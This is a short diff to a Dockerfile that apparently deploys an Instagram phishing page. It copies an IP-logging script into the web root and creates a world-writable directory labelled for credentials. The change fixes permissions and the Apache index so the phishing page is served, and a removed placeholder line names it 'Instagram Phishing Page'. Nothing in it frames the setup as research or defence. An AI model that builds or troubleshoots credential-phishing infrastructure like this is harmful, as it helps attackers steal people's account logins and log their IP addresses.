@@ -8,18 +8,17 @@ COPY .sites/ip.php /var/www/html/
 # Create auth directory for credentials
 RUN mkdir -p /var/www/html/auth && chmod 777 /var/www/html/auth
 
-# Fix permissions for all files
+# Fix permissions - THIS IS THE KEY FIX
 RUN chown -R www-data:www-data /var/www/html/ && \
     chmod -R 755 /var/www/html/ && \
-    chmod -R 777 /var/www/html/auth
+    chmod 644 /var/www/html/index.php
 
 # Enable Apache modules
 RUN a2enmod rewrite
 
-# Create a default index if missing
-RUN if [ ! -f /var/www/html/index.php ]; then \
-        echo '<?php echo "Instagram Phishing Page"; ?>' > /var/www/html/index.php; \
-    fi
+# Ensure index.php is the default
+RUN echo "DirectoryIndex index.php" > /etc/apache2/conf-available/directory-index.conf && \
+    a2enconf directory-index
 
 EXPOSE 80
 
